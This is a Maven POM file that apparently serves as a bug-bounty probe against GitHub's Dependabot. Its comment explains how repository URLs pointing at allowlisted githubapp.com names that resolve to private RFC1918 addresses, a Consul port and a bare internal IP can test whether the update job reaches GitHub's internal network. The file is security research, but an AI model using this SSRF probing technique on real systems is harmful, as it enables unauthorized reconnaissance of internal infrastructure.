<?xml version="1.0" encoding="UTF-8"?>
<!--
  AUTHORIZED SECURITY RESEARCH FIXTURE - GitHub Security Bug Bounty (HackerOne: github).
  Inert Maven metadata. Unauthenticated GET for a deliberately NONEXISTENT artifact path only.

  RUN 5 asks the one question that decides whether the Dependabot egress primitive is
  payable: does the update job's network position reach a host on GitHub's INTERNAL
  network? The programme's Dependabot asset text names reaching private networked
  resources as eligible, and names reaching the public internet as INELIGIBLE.

  RUN 3 concluded "no internal reach", but its internal arms were nines.githubapp.com and
  nines-staging.githubapp.com. Those are DEAD names: their CNAME targets
  (ninesapp-app-service{,-staging}.azurewebsites.net) are NXDOMAIN for everyone, inside or
  out. Their failure to resolve inside the job therefore proves nothing about network
  position. Run 3's other arms were invented hostnames. So the question is still open.

  i1/i2 are the valid arm. consul-acl.githubapp.com has a PUBLIC DNS record resolving to
  10.157.12.74, which is RFC1918. The name is under .githubapp.com, which the proxy's
  egress allowlist permits in leading-dot form. So the name resolves for anyone but the
  address is routable only from inside.

  ORACLE: i1 or i2 returning ANY HTTP status proves the job reached an internal host.
  The requested artifact does not exist, so a reachable service answers 404/403 and
  returns no data at all. That is the whole proof; nothing further is attempted.

  i3 is the CONTROL: an allowlisted name on a PUBLIC address that answers today. Without
  it a wall of failures would prove nothing, which was run 3's defect.
  i4 isolates the lever: the same private address as a bare IP, with no hostname.
  i5 is a secondary split-horizon oracle (internal CNAME target, NXDOMAIN publicly).
-->
<project xmlns="http://maven.apache.org/POM/4.0.0">
  <modelVersion>4.0.0</modelVersion>
  <groupId>com.bbresearch</groupId>
  <artifactId>egress-probe-parent</artifactId>
  <version>1.0.2</version>
  <packaging>pom</packaging>

  <repositories>
    <repository>
      <id>i1-internal-rfc1918-via-allowlisted-name</id>
      <url>http://consul-acl.githubapp.com/i1</url>
    </repository>
    <repository>
      <id>i2-internal-rfc1918-consul-api-port</id>
      <url>http://consul-acl.githubapp.com:8500/i2</url>
    </repository>
    <repository>
      <id>i3-CONTROL-allowlisted-name-public-address</id>
      <url>https://customer-stories.githubapp.com/i3</url>
    </repository>
    <repository>
      <id>i4-bare-private-ip-no-hostname</id>
      <url>http://10.157.12.74/i4</url>
    </repository>
    <repository>
      <id>i5-internal-cname-nxdomain-publicly</id>
      <url>http://nexpose.githubapp.com/i5</url>
    </repository>
  </repositories>
</project>
